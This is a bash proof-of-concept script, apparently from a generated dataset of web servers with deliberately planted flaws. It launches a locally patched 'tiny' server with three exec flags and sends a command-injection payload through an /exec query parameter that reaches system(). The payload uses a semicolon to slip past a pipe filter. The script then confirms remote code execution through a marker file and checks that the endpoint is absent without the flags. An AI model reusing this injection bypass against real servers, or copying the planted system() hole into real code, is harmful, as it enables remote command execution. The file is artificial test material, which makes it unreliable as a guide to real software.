#!/usr/bin/env bash
# PoC for 020_tiny-web-server_C3I1S2
# Axes: C3 (three-flag gate via exec_is_ready()) / I1 (direct to system()) / S2 (pipe blocked; bypass with ;)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (tiny) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/tiny"
WWWROOT="/tmp/poc_020_www"
MARKER="/tmp/poc_020_marker"
PORT=18020

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting tiny with --exec-mode --exec-logging --exec-init on port $PORT..."
"$BINARY" --exec-mode --exec-logging --exec-init "$WWWROOT" $PORT &
SERVER_PID=$!
sleep 0.4

# ── trigger (bypass S2 with semicolon instead of pipe) ────────────────────────
echo "[*] sending payload: cmd=id;id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id;id>${MARKER}" > /dev/null || true

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint absent without all three flags ──────────────────
echo "[*] verifying gate: endpoint must be absent without all three flags..."
"$BINARY" "$WWWROOT" 19020 &
SAFE_PID=$!
sleep 0.4
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:19020/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without flags"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
